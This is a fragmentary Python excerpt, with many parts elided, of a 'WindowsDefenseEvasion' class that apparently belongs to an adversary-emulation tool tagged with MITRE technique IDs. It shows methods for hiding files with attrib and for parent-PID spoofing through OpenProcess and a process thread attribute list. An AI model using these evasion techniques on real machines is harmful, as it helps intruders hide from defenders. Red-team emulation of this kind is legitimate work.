...
class STARTUPINFOEX(ctypes.Structure):
    _fields_ = [("StartupInfo", win32process.STARTUPINFO), ("lpAttributeList", ctypes.c_void_p)]
...
class WindowsDefenseEvasion:
    ...
    def evade(self, technique: str, details: Dict[str, Any]) -> Dict[str, Any]:
        ...
        if handler:
            ...
            try:
                ...
                logger.error(
                    f"Error executing Windows evasion technique '{technique}': {e}", exc_info=True
                )
            ...
            return {
                "status": "failure",
                "technique": technique,
                "reason": f"Unsupported technique '{technique}' for Windows",
            }
    ...
    def _hide_file(self, details: Dict[str, Any]) -> Dict[str, Any]:
        ...
        try:
            ...
            result_details["execution_return_code"] = exec_result.get("details", {}).get(
                "return_code"
            )

            if (
                exec_result.get("status") == "success"
                and exec_result.get("details", {}).get("return_code") == 0
            ):
                status = "success"
                self.logger.info(f"Successfully hid file using attrib: {target_file}")
            else:
                reason = exec_result.get("details", {}).get("stderr") or exec_result.get(
                    "message", "Execution failed"
                )
                result_details["reason"] = reason
                self.logger.error(
                    f"Failed to hide file using attrib: {target_file}. Reason: {reason}"
                )
    ...
    def _handle_pid_spoofing(self, details: Dict[str, Any]) -> Dict[str, Any]:
        ...
        if not parent_pid_str or not command_to_run:
            return {
                "status": "error",
                "reason": "Missing 'parent_pid' or 'command_to_run' in details.",
                "mitre_technique_id": mitre_id,
                "mitre_technique_name": mitre_name,
            }
        ...
        try:
            ...
            parent_process_handle = win32api.OpenProcess(
                win32con.PROCESS_CREATE_PROCESS, False, parent_pid
            )
            self.logger.debug(
                f"Obtained handle for parent process PID {parent_pid}: {parent_process_handle}"
            )
            ...
            if not win32process.InitializeProcThreadAttributeList(
                startup_info_ex.lpAttributeList, 1, 0, ctypes.byref(size)
            ):
